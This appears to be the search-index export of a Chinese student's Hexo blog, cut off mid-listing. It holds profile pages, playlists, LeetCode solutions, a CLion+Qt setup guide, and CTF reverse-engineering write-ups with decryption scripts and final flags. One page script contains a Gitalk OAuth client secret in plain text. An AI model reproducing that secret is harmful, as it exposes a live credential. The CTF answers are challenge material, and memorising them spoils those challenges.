{"pages":[{"title":"","text":"WHO AM I (・ω・´)欸欸，怎么点进人家的博客里才想起来要问人家是谁嘛！！（气鼓鼓 嘛，这样的话，看来咱还是得重新介绍一次自己才行呢。 呐呐，这里是MeteorPursuer的说，也可以称呼人家为MD/Meteor/星酱（x），总之称呼随意啦 (・ω・´) 绘圈透明小画手（经常咕咕咕（开坑无数（专业磕冷门cp30年呜呜呜（x） 爱好计算机科学与信息安全的小萌新一只，目前坐标XDUqwq 对计算机相关的一切都感兴趣！但是二进制入门好难啊QAQ（x）（←划掉 以上，后面的想到了再更新 (・ω・´) 至于为什么要叫MeteorPursuer，嘛，如果是你的话，一定能猜得到的吧，呐？ ABOUT THIS BLOG (´∀｀人´∀｀)嘛，说实话咱也还没想好要拿这个博客来干什么，只是因为hexo + github pages建站实在是太过于方便再加上——我！超！爱！amazing主题的那种顺滑的效果！！所以就哼哧哼哧地建了一个站的说~ 不过嘛，至于究竟要写些什么东西其实人家一直都还没想好，或许会在这里堆积各种奇奇怪怪的东西叭，主要还是想记录一些技术向的东西啦！偶尔也会写点（自认为）技术性的东西~ 看了一下好像说了许多废话呢，欸嘿嘿嘿~ 嘛，总之欢迎米娜桑多来人家的小屋看看~de⭐su","link":"/about/index.html"},{"title":"","text":"申请友链须知 - 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://meteorpursuer.github.io/img/avatar.png 网站名称：追逐星辰的人 网站地址：https://meteorpursuer.github.io 网站简介： 月落影沉，光弥星烬 加载中，稍等几秒...","link":"/ffriend/index.html"},{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 - 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 - 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 - 申请请提供：站点名称、站点链接、站点描述、**logo或头像**（`不要设置防盗链`）。 - 排名不分先后，刷新后重排，更新信息后请留言告知。 - 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 - 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 - 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://meteorpursuer.github.io/img/avatar.png 网站名称：追逐星辰的人 网站地址：https://meteorpursuer.github.io 网站简介： 月落影沉，光弥星烬 加载中，稍等几秒...","link":"/ffriend/indexx.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"","text":"[{\"img\":\"https://dp2px.com/json-data/banner/git-github.jpeg\",\"url\":\"https://space.bilibili.com/386767453/channel/detail?cid=84534\",\"alt\":\"让你彻底理解Git视频教程\"},{\"img\":\"https://dp2px.com/json-data/banner/android-video.jpg\",\"url\":\"https://space.bilibili.com/386767453/channel/detail?cid=83639\",\"alt\":\"Android从入门到进阶全套视频教程\"},{\"img\":\"https://dp2px.com/json-data/banner/win10-tools.png\",\"url\":\"https://www.bilibili.com/video/av90639199\",\"alt\":\"Win10 常用工具和软件推荐\"},{\"img\":\"https://dp2px.com/json-data/banner/blog-build.png\",\"url\":\"https://space.bilibili.com/386767453/channel/detail?cid=89247\",\"alt\":\"个人博客搭建视频教程\"}]","link":"/json_data/banner.json"},{"title":"","text":"[{\"date\":\"2020.09.09\",\"src\":\"/img/reverier.bmp\",\"name\":\"Reverier\",\"desc\":\"XDSEC 2019 全栈强者\",\"url\":\"https://www.wootec.top/\"},{\"date\":\"2020.09.09\",\"src\":\"/img/arttnba3.png\",\"name\":\"arttnba3\",\"desc\":\"XDSEC 2019 绘 圈 壬\",\"url\":\"https://arttnba3.cn/\"},{\"date\":\"2020.09.09\",\"src\":\"/img/eqqie.bmp\",\"name\":\"赤道企鹅\",\"desc\":\"XDSEC 2019 全栈带黑阔\",\"url\":\"https://eqqie.cn/\"},{\"date\":\"2020.09.09\",\"src\":\"/img/luoqian.bmp\",\"name\":\"luoqian\",\"desc\":\"XDSEC 2019 运维の神\",\"url\":\"https://luoq1an.github.io/\"},{\"date\":\"2020.09.09\",\"src\":\"/img/shallow.bmp\",\"name\":\"shallow\",\"desc\":\"XDSEC 2019 密码学教授\",\"url\":\"https://shal10w.github.io/\"},{\"date\":\"2020.09.09\",\"stopTime\":\"2020.11.01\",\"src\":\"/img/blackbird.jpg\",\"name\":\"Blackbird\",\"desc\":\"XDSEC 2020 全栈强者\",\"url\":\"https://blackbird-bb.github.io\",\"valid\":1}]","link":"/json_data/friend.json"},{"title":"","text":"[{\"src\":\"http://www.ytmp3.cn/down/35108.mp3\",\"title\":\"国歌　　　　　\",\"author\":\"伴奏　　　\",\"time\":\"00:50:00\",\"desc\":\"无论何时何地，爱国之心永存不朽!中国国歌为《义勇军进行曲》，2017年9月1 日第十二届全国人民代表大会常务委员会第二十九次会议通过的《中华人民共和国国歌法》明确规定：国歌标准曲谱和国歌官方录音版本，应当在中国人大网和中国政府网上发布。2017年11月4日，十二届全国人大常委会第三十次会议表决通过了中华人民共和国刑法修正案(十)，将侮辱国歌行为写入其中，规定在公共场合侮辱国歌情节严重的，处三年以下有期徒刑、拘役、管制或者剥夺政治权利。\",\"loop\":true,\"cover\":\"http://p2.music.126.net/p1xmBAzvpBrIZxhModezXQ==/118747255814936.jpg?param=130y130\",\"lrc\":\"[ti:中华人民共和国国歌]\\n[offset:300]\\n[00:01.00]《中华人民共和国国歌》\\n[00:03.00]作词：田汉/作曲：聂耳\\n[00:07.58]起来！\\n[00:08.42]不愿做奴隶的人们！\\n[00:12.21]把我们的血肉，\\n[00:14.34]筑成我们新的长城！\\n[00:18.42]中华民族到了最危险的时候，\\n[00:24.86]每个人被迫着发出最后的吼声。\\n[00:30.20]起来！\\n[00:31.47]起来！\\n[00:32.74]起来！\\n[00:34.45]我们万众一心，\\n[00:36.91]冒着敌人的炮火 前进！\\n[00:40.83]冒着敌人的炮火 前进！\\n[00:44.81]前进！\\n[00:46.02]前进！\\n[00:47.20]进！\"},{\"src\":\"http://music.163.com/song/media/outer/url?id=355992.mp3\",\"title\":\"追梦赤子心　　\",\"author\":\"GALA\",\"time\":\"05:17:00\",\"cover\":\"http://p1.music.126.net/XDncptlBJ4_LN3hLBx-8aw==/19061133579343591.jpg\",\"loop\":true,\"desc\":\"GALA乐队在创作这首《追梦赤子心》时表示，他们在创作里加入了许多的情绪和手法，也在不断尝试着各种可能性。他们开始了更多的审视和思考。作为乐队的第二部作品，他们在创作《追梦赤子心》时就将怀旧的印记带入其中。不仅如此，乐队还希望用这首歌来告诉大家：就算遇到挫折、受到嘲笑，也要勇敢的向前跑。\",\"lrc\":\"[00:00.000] 作曲 : GALA\\n[00:00.110] 作词 : GALA\\n[00:15.330]充满鲜花的世界到底在哪里\\n[00:21.310]如果它真的存在那么我一定会去\\n[00:28.760]我想在那里最高的山峰矗立\\n[00:34.180]不在乎它是不是悬崖峭壁\\n[00:38.870]\\n[00:42.010]用力活着用力爱哪怕肝脑涂地\\n[00:47.830]不求任何人满意只要对得起自己\\n[00:55.200]关于理想我从来没选择放弃\\n[01:00.660]即使在灰头土脸的日子里\\n[01:06.440]\\n[01:07.390]也许我没有天分\\n[01:10.600]但我有梦的天真\\n[01:13.900]我将会去证明用我的一生\\n[01:20.640]也许我手比较笨\\n[01:23.850]但我愿不停探寻\\n[01:27.260]付出所有的青春不留遗憾\\n[01:32.690]\\n[01:34.610]向前跑 迎着冷眼和嘲笑\\n[01:40.160]生命的广阔不历经磨难怎能感到\\n[01:47.130]命运它无法让我们跪地求饶\\n[01:54.710]就算鲜血洒满了怀抱\\n[01:59.620]\\n[02:00.980]继续跑 带着赤子的骄傲\\n[02:07.690]生命的闪耀不坚持到底怎能看到\\n[02:14.020]与其苟延残喘不如纵情燃烧吧\\n[02:22.460]有一天会再发芽\\n[02:29.330]\\n[02:56.260]未来迷人绚烂总在向我召唤\\n[03:01.180]哪怕只有痛苦作伴也要勇往直前\\n[03:09.070]我想在那里最蓝的大海扬帆\\n[03:14.780]绝不管自己能不能回还\\n[03:20.220]\\n[03:21.890]失败后郁郁寡欢\\n[03:24.760]那是懦夫的表现\\n[03:28.190]只要一息尚存请握紧双拳\\n[03:35.010]在天色破晓之前\\n[03:38.170]我们要更加勇敢\\n[03:41.640]等待日出时最耀眼的瞬间\\n[03:46.970]\\n[03:49.270]向前跑 迎着冷眼和嘲笑\\n[03:55.600]生命的广阔不历经磨难怎能感到\\n[04:02.610]命运它无法让我们跪地求饶\\n[04:09.530]就算鲜血洒满了怀抱\\n[04:13.940]\\n[04:16.110]继续跑 带着赤子的骄傲\\n[04:22.720]生命的闪耀不坚持到底怎能看到\\n[04:29.170]与其苟延残喘不如纵情燃烧\\n[04:36.970]为了心中的美好\\n[04:43.980]不妥协直到变老\\n[04:50.460]\\n\"}]","link":"/json_data/music.json"},{"title":"","text":"[{\"date\":\"2019.09.10\",\"title\":\"梦想一旦被付诸行动，就会变得神圣\",\"achievement\":\"-丁尼生\"},{\"date\":\"2019.09.07\",\"title\":\"生如夏花，逝如冬雪\",\"achievement\":\"-《明朝那些事儿》\"},{\"date\":\"2019.04.22\",\"title\":\"你写下的每一个bug，都是人类反抗被人工智能统治的一颗子弹\",\"achievement\":\"–未知\"},{\"date\":\"2019.04.22\",\"title\":\"所谓活着并不是单纯的呼吸，心脏跳动，也不是脑电波，而是在这个世界上留下痕迹。要能看见自己一路走来的脚印，并确信那些都是自己留下的印记，这才叫活着。\",\"achievement\":\"–《东野圭吾》\"}]","link":"/json_data/record.json"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"","text":"[{\"desc\":\"数万人齐聚在北京天安门广场，在国旗下，用歌声唱响《我爱你中国》\",\"url\":\"http://gslb.miaopai.com/stream/7fpnBTKIXhtHR~gpA-jLv0cXj5XLDpYbHOESyA__.mp4\"},{\"desc\":\"为了祖国！五星红旗你是我的骄傲\",\"url\":\"http://gslb.miaopai.com/stream/dMwe1NrmMoSENiiUQTuQ7f97u7i6HEwpuwCWWw__.mp4\"},{\"desc\":\"#深圳湾点亮中国红#，上演了一场精彩的无人机表演\",\"url\":\"http://gslb.miaopai.com/stream/zD0b05nm0tDToQjflKZ68EZN3IldJjl9Qx8NqA__.mp4\"},{\"desc\":\"一起来晒你和国旗的同框合影吧 爱就大声说出来\",\"url\":\"http://gslb.miaopai.com/stream/b9z-sriEV837gM2P2OoyRTxXm8eCqW9X3quS5g__.mp4\"},{\"desc\":\"庆祝新中国成立70周年华诞！快闪《我和我的祖国》\",\"url\":\"http://gslb.miaopai.com/stream/i7U~5uYYqnEQiAdKzIYcQut6nEkOb7-d7cYhag__.mp4\"},{\"desc\":\"画面引起极度舒适！武警国宾护卫队超燃表白\",\"url\":\"http://gslb.miaopai.com/stream/F~K7R5KPnXu8SeJbRqjQjspql840dzhIjPv5kw__.mp4\"},{\"desc\":\"燃！90秒速看中国海军五大兵种\",\"url\":\"http://gslb.miaopai.com/stream/LSsaxNI4KKZ6ccKy9MgXdZmvSMYBpxAZlsZoTQ__.mp4\"},{\"desc\":\"via@电影一生有你 一生有你MV 片段\",\"url\":\"http://gslb.miaopai.com/stream/UUbv~sd6AVaViuYDrubP~YS5v4EG-2NTes85dQ__.mp4\"},{\"desc\":\"花甲老兵寻战友：希望一起看一次升旗\",\"url\":\"http://gslb.miaopai.com/stream/tdKhIae~IDCjiw1v7lJQogsGSnJXOzC6JqNspQ__.mp4\"},{\"desc\":\"每秒都热血！一镜到底纵览海军70年装备库\",\"url\":\"http://gslb.miaopai.com/stream/j7dFmYxJWxYVlN8JNRNX~zXONpCxUCE-CIYlMA__.mp4\"},{\"desc\":\"2019版第五套人民币宣传片\",\"url\":\"http://gslb.miaopai.com/stream/arxtADaDqTX-nqtHa2sdU2d5Zwd0EFHce9J~lw__.mp4\"},{\"desc\":\"回首峥嵘岁月，不忘初心！展望未来发展，扬帆远航\",\"url\":\"http://gslb.miaopai.com/stream/ILmTaHQdv7Z1ZJ3gBosfs0~MixoNnIQWstNKiw__.mp4\"}]","link":"/json_data/video.json"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"}],"posts":[{"title":"GWCTF 2019 write up for xxor","text":"z3是个坏家伙（x 惯例的拖入IDA进行分析 一开始先输入六个字符，之后是每两个字符放入sub_400686()中进行处理，跟进该函数 变量v3、v4分别为每组的第1、2个字符，在这里进行了十分令人作呕的算术操作（x 在这里所传入的参数a2为bss段上变量，按dword来读的话应该是一个数组[2, 2, 3, 4]（小端序）： 处理后进行flag验证的函数sub_400770()逻辑如下： 这里还需要解一个小方程得到a1[2]、a1[3]、a1[4]的值，用z3快速解方程： 这里z3在本地虚拟机安了没法用，在阿里云学生机上倒是能跑，离谱… 123456789101112131415from z3 import *x = [0] * 6for i in range(6): x[i] = Int('x[' + str(i) + ']')s = Solver()s.add(x[0]==0xDF48EF7E)s.add(x[5]==0x84F30420)s.add(x[1]==0x20CAACF4)s.add(x[2]-x[3]==0x84A236FF)s.add(x[3]+x[4]==0xFA6CB703)s.add(x[2]-x[4]==0x42D731A8)s.check()print(s.model()) 1234567$ python3 py.py [x[2] = 3774025685, x[3] = 1548802262, x[4] = 2652626477, x[1] = 550153460, x[5] = 2230518816, x[0] = 3746099070] 那么我们逆着这个逻辑就可以得到解密程序如下： 在这里没有用python的原因是源程序计算中必定发生整型溢出，而python普通的整型没有溢出 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;cstdio&gt;using namespace std;int main(void){ unsigned int enc[6] = {3746099070, 550153460, 3774025685, 1548802262, 2652626477, 2230518816}; int a2[4] = {2, 2, 3, 4}; int val = 0x40 * 1166789954; for(int i=0; i&lt; 6; i+=2) { int v5 = val; unsigned int v3 = enc[i], v4 = enc[i + 1]; for(int j=0; j&lt; 0x40; j++) { v4 -= (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10; v3 -= (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20; v5 -= 1166789954; } enc[i] = v3; enc[i + 1] = v4; } for(int i=0; i &lt; 6; i++) printf(&quot;\\'0x%x\\', &quot;, enc[i]);} 最终解密脚本如下： 123456flag = ['0x666c61', '0x677b72', '0x655f69', '0x735f67', '0x726561', '0x74217d']for i in flag: temp = i[2:] while temp != '': print(chr(int('0x' + temp[:2], 16)), end = '') temp = temp[2:] 得到flag： 1flag{re_is_great!}","link":"/2020/12/10/GWCTF%202019%20write%20up%20for%20xxor/"},{"title":"Windows下配置CLion+Qt5开发环境","text":"前言在众多的GUI库中，Qt作为一款跨平台的GUI库无疑是十分强大的，但是Qt Creator的界面实在是太丑啦！所以今天找了个机会配置了CLion + Qt5的开发环境~ jet brains全家桶都挺好看的&gt; v &lt; 预备知识：CMAKE 前置环境添加Qt运行库虽然Qt Creator又庞大又笨重又丑（划掉），但是为了开发Qt程序，Qt的运行库是必不可缺的 将Qt安装在自己喜欢的位置，之后： 右键 此电脑 -&gt; 属性 点击 高级系统设置 -&gt; 环境变量 点击 系统变量 选择 Path 点击 【编辑】【新建】，添加如下四个环境变量 需要注意的是这里的路径是你自己电脑上的Qt安装路径（当然你也可以选择和我安装在同一个位置wwww 修改CLion设置打开Clion： File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Toolchains 修改配置如下图所示 项目配置CMakeList.txt 在Qt Creator中使用qmake来构建项目，而在CLion中则是默认使用cmake，其配置文件为CMakeList.txt 当我们新建一个空白项目之后，我们还需要将需要用到的Qt的库通过CMakeList.txt添加到项目中 这里以一个简单的空白Qt窗口为例： 12345678910111213#include &lt;iostream&gt;#include &lt;QApplication&gt;#include &lt;QWidget&gt;using namespace std;int main(int argc, char *argv[]){ QApplication q(argc, argv); QWidget w; w.show(); return q.exec();} 我们需要将CMakeList.txt修改为如下形式： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152cmake_minimum_required(VERSION 3.0)project(test)set(CMAKE_CXX_STANDARD 17)set(CMAKE_INCLUDE_CURRENT_DIR ON)# 自动调用moc，uic，rcc处理qt的扩展部分set(CMAKE_AUTOMOC ON)set(CMAKE_AUTOUIC ON)set(CMAKE_AUTORCC ON)# 手动设置Qt5的cmake模块所在目录# QT_DIR和QT_VERSION是指定了qt安装目录和版本的环境变量# 如果你使用了系统的cmake，那么会优先使用系统提供模块，因为cmake会优先搜索CMAKE_SYSTEM_PREFIX_PATH# 如果你不想让cmake优先搜索系统目录（会导致编译使用系统安装的qt而不是我们配置的），需要提示find_package命令# set(CMAKE_PREFIX_PATH ${CMAKE_PREFIX_PATH} $ENV{QT_DIR}/$ENV{QT_VERSION}/gcc_64/lib/cmake)# 添加Widgets模块，需要注意的是Qt模块名前面都要加上Qt5，模块名首字母大写# REQUIRED参数表示自动查找其他的所需模块find_package(Qt5Widgets REQUIRED)# 不使用系统变量而是使用自定义路径# set(CMAKE_PREFIX_PATH D:/Qt/Qt5.14.1/5.14.1/mingw73_64)# find_package(Qt5Widgets REQUIRED NO_DEFAULT_PATH)# 以下为未来你可能会用到的Qt相关组成部分www# set(UI_FILES)# set(RC_FILES)# set(QRC_FILES)add_executable(test main.cpp)# 把对应Qt模块的库链接进程序target_link_libraries(test Qt5::Widgets) 经过如上配置，我们就可以用CLion来写Qt程序啦~ 构建，运行，一气呵成，撒花花~🌸🌸🌸 `","link":"/2020/11/15/Windows%E4%B8%8B%E9%85%8D%E7%BD%AECLion+Qt5%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"},{"title":"Hello World","text":"WHO AM I (・ω・´) 欸欸，怎么点进人家的博客里才想起来要问人家是谁嘛！！（气鼓鼓 嘛，这样的话，看来咱还是得重新介绍一次自己才行呢。 呐呐，这里是MeteorPursuer的说，也可以称呼人家为MD/Meteor/星酱（x），总之称呼随意啦 (・ω・´) 绘圈透明小画手（经常咕咕咕（开坑无数（专业磕冷门cp30年呜呜呜（x） 爱好计算机科学与信息安全的小萌新一只，目前坐标XDU，大一计算机大类在读，目前被高数折磨得不成人样qwq 对计算机相关的一切都感兴趣！但是C++入门好难啊QAQ（x）（←划掉 微博是@MeteorPursuer，欢迎各位大佬前来互fo_(:з)∠)_ 以上，后面的想到了再更新 (・ω・´) 至于为什么要叫MeteorPursuer，嘛，如果是你的话，一定能猜得到的吧，呐？ ABOUT THIS BLOG (´∀｀人´∀｀)嘛，说实话咱也还没想好要拿这个博客来干什么，只是因为hexo + github pages建站实在是太过于方便再加上——我！超！爱！amazing主题的那种顺滑的效果！！所以就哼哧哼哧地建了一个站的说~ 不过嘛，至于究竟要写些什么东西其实人家一直都还没想好，或许会在这里堆积各种奇奇怪怪的东西叭，主要还是想记录一些技术向的东西啦！偶尔也会写点（自认为）技术性的东西~ 看了一下好像说了许多废话呢，欸嘿嘿嘿~ 嘛，总之欢迎米娜桑多来人家的小屋看看~de⭐su","link":"/2023/02/05/hello-world/"},{"title":"dmctf2020 write up for re4","text":"神必的最短路径… 惯例的拖入IDA，发现只读入了50个字符，没法溢出（x 大概是一个类似走10 * 10迷宫的小程序？ 手动抠迷宫出来（抠吐了），其中1为通路，0为墙，如下： 123456789101000011000110001110001000101000111110100000011010000000001000000000110000000001000000000110000000001 按照这个布局，v6为y，v5为x，0123对应→←↓↑ 走最短路，最终得出flag应当为： 1flag{2022000033002222202202}","link":"/2020/12/10/dmctf2020%20write%20up%20for%20re4/"},{"title":"Leetcode - 141：环形链表","text":"（这题有漏洞（x 141.环形链表 给定一个链表，判断链表中是否有环。 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。 如果链表中存在环，则返回 true 。 否则，返回 false 。 进阶： 你能用 O(1)（即，常量）内存解决此问题吗？ 示例 1： 输入：head = [3,2,0,-4], pos = 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。示例 2： 输入：head = [1,2], pos = 0输出：true解释：链表中有一个环，其尾部连接到第一个节点。示例 3： 输入：head = [1], pos = -1输出：false解释：链表中没有环。 提示： 链表中节点的数目范围是 [0, 104]-105 &lt;= Node.val &lt;= 105pos 为 -1 或者链表中的一个 有效索引 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/linked-list-cycle著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解法一：快慢指针老快慢指针人了，只要链表中存在环那么在遍历过程中步长不一的快慢指针肯定会相遇 构造代码如下： 123456789101112131415161718192021222324/** * Definition for singly-linked list. * struct ListNode { * int val; * struct ListNode *next; * }; */bool hasCycle(struct ListNode *head) { if(!head) return false; struct ListNode * ptr1 = head, *ptr2 = head-&gt;next; while(ptr1 &amp;&amp; ptr2) { if(ptr1 == ptr2) return true; ptr1 = ptr1-&gt;next; ptr2 = ptr2-&gt;next; if(!ptr2) break; ptr2 = ptr2-&gt;next; } return false;} 解法二：利用题目数据范围漏洞题目保证结点数量小于10000，那么只要遍历能循环超过10000次，链表中就必定存在回路 构造代码如下： 12345678910111213141516171819/** * Definition for singly-linked list. * struct ListNode { * int val; * struct ListNode *next; * }; */bool hasCycle(struct ListNode *head) { int n = 0; while(head) { head = head-&gt;next; n++; if(n &gt; 10000) return true; } return false;}","link":"/2021/01/14/leetcode%20-%20141/"},{"title":"dmctf2020 write up for re1","text":"（这题有漏洞（x 惯例的拖入IDA进行分析，推测这个函数应当是读取输入的函数 最讨厌win逆向啦！ 目标字符串位于栈上，测试了一下很明显有个栈溢出 但是这不是一道winpwn而是一道re，应该先做点正事… 程序逻辑比较简单，我们先跟进sub_485D1A()函数，该函数的作用是验证flag长度是否为20 那么sub_4849EC()就应当是验证flag内容的函数，跟进 加密后的flag为fmesh{umkc_vlrn_glh}，在这里对flag的加密逻辑也比较简单，直接把脚本写出来，如下： 123456789101112enc = &quot;fmesh{umkc_vlrn_glh}&quot;flag = ''for i in enc: j = ord(i) + 1 if j &lt; ord('a') or j &gt; ord('l'): if j &gt; ord('n') and j &lt;= ord('z'): flag += chr(j) else: flag += i continue flag += chr(ord(i) - 2)print(flag) 得到flag： 1dmctf{vmia_wlso_elf} 但是题目本身算法存在问题，所以这个仅仅是一解…（不管了啦！暴捶出题人！","link":"/2020/12/09/dmctf2020%20write%20up%20for%20re1/"},{"title":"Leetcode - 445：两数相加","text":"很常规的一道题.. 445.两数相加 II 给你两个 非空 链表来代表两个非负整数。数字最高位位于链表开始位置。它们的每个节点只存储一位数字。将这两数相加会返回一个新的链表。 你可以假设除了数字 0 之外，这两个数字都不会以零开头。 进阶： 如果输入链表不能修改该如何处理？换句话说，你不能对列表中的节点进行翻转。 示例： 输入：(7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 8 -&gt; 0 -&gt; 7 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/add-two-numbers-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 其实就是相当于常规的大数加减：链表版本（老OIer应该都写过无数遍了 解法一：链表逆序将两个链表先重新构造成其逆序链表，再逐位进行运算即可 构造代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/** * Definition for singly-linked list. * struct ListNode { * int val; * struct ListNode *next; * }; */struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2){ if(!l1) return l2; if(!l2) return l1; struct ListNode * temp = NULL, *temp2; while(l1) { temp2 = l1-&gt;next; l1-&gt;next = temp; temp = l1; l1 = temp2; } l1 = temp; temp = NULL; while(l2) { temp2 = l2-&gt;next; l2-&gt;next = temp; temp = l2; l2 = temp2; } l2 = temp; int flag = 0; struct ListNode * retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = NULL; while(l1&amp;&amp;l2) { retn-&gt;val = (l1-&gt;val + l2-&gt;val + flag) % 10; flag = (l1-&gt;val + l2-&gt;val + flag) / 10; temp = retn; retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = temp; l1 = l1-&gt;next; l2 = l2-&gt;next; } while(l1) { retn-&gt;val = (l1-&gt;val + flag) % 10; flag = (l1-&gt;val + flag) / 10; temp = retn; retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = temp; l1 = l1-&gt;next; } while(l2) { retn-&gt;val = (l2-&gt;val + flag) % 10; flag = (l2-&gt;val + flag) / 10; temp = retn; retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = temp; l2 = l2-&gt;next; } if(flag) { retn-&gt;val = flag; return retn; } return retn-&gt;next;} 解法二：栈进阶解法要求我们不对链表进行重构 当然，既然是逆序运算，我们很容易就能够联想到另外一种受限线性表——栈 我们可以先将两个链表的结点值分别压入两个数组模拟的栈中，这样就变成我们最常见也最喜欢的常规的大数加减了 构造代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * Definition for singly-linked list. * struct ListNode { * int val; * struct ListNode *next; * }; */struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2){ if(!l1) return l2; if(!l2) return l1; int * n1 = (int*) malloc(sizeof(int) * 99), *n2 = (int*) malloc(sizeof(int) * 99), *temp, temp2; int len1 = 0, len2 = 0; while(l1) { n1[len1++] = l1-&gt;val; l1 = l1-&gt;next; } while(l2) { n2[len2++] = l2-&gt;val; l2 = l2-&gt;next; } if(len1&lt;len2) { temp = n1; n1 = n2; n2 = temp; temp2 = len1; len1 = len2; len2 = temp2; } struct ListNode * retn = (struct ListNode*)malloc(sizeof(struct ListNode)), *tmp; retn-&gt;next = NULL; int flag = 0; for(len1--,len2--;len2&gt;=0;len1--,len2--) { retn-&gt;val = (n1[len1] + n2[len2] + flag) % 10; flag = (n1[len1] + n2[len2] + flag) / 10; tmp = retn; retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = tmp; } while(len1!=-1) { retn-&gt;val = (n1[len1] + flag) % 10; flag = (n1[len1] + flag) / 10; tmp = retn; retn = (struct ListNode*)malloc(sizeof(struct ListNode)); retn-&gt;next = tmp; len1--; } if(flag) { retn-&gt;val = flag; return retn; } return retn-&gt;next;} 当然，因为需要额外的栈空间，所以空间复杂度上不是很理想（分明是退阶解法","link":"/2021/02/27/leetcode%20-%20445/"},{"title":"Leetcode - 685：冗余连接","text":"树树树树树树树树树树树… 684.冗余连接 在本问题中, 树指的是一个连通且无环的无向图。 输入一个图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。 结果图是一个以边组成的二维数组。每一个边的元素是一对[u, v] ，满足 u &lt; v，表示连接顶点u 和v的无向图的边。 返回一条可以删去的边，使得结果图是一个有着N个节点的树。如果有多个答案，则返回二维数组中最后出现的边。答案边 [u, v] 应满足相同的格式 u &lt; v。 示例 1： 输入: [[1,2], [1,3], [2,3]]输出: [2,3]解释: 给定的无向图为:1/ \\2 - 3示例 2： 输入: [[1,2], [2,3], [3,4], [1,4], [1,5]]输出: [1,4]解释: 给定的无向图为:5 - 1 - 2 | | 4 - 3注意: 输入的二维数组大小在 3 到 1000。二维数组中的整数在1到N之间，其中N是输入数组的大小。更新(2017-09-26):我们已经重新检查了问题描述及测试用例，明确图是无向 图。对于有向图详见冗余连接II。对于造成任何不便，我们深感歉意。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/redundant-connection著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 图有的时候是树，树无时无刻是图 解法：并查集由于本题所给的是无向图，故不需要考虑边的方向 考虑并查集算法：将所有联通的点都纳入数个集合中以方便查找： 初始化每个点为一个自身的集合 逐条边读入，分别查找两端点所属集合 两点所属集合不同则合并两集合，否则返回该条边即可 初版代码一开始我是这么写的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * Note: The returned array must be malloced, assume caller calls free(). */int set[10000][10000]={0};//第一维分配给每一个点，第二维作为该点的集合保存其他附庸点int set_size[10000][2]={0};//0表示所属集合，1表示集合中点的数量int find_x(int src){ return set_size[src][0] == src ? src : find_x(set_size[src][0]);}void union_set(int s1, int s2){ while(set_size[s1][0]!=s1) s1 = set_size[s1][0]; 